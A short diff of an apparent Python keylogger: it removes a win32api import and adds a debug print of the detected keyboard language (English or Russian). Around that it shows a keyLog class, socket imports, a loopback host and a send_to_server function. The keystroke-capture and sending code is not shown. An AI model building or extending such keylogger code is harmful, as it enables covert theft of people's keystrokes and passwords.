@@ -2,7 +2,6 @@ from socket import *
 import keyboard
 from threading import Timer
 import ctypes
-import win32api
 
 print('START 1')
 HOST = "127.0.0.1"  # Standard loopback interface address (localhost)
@@ -62,6 +61,7 @@ class keyLog:
             self.currentLanguage = 'en'
         else:
             self.currentLanguage = 'ru'
+        print(self.currentLanguage)
 
 
 def send_to_server():
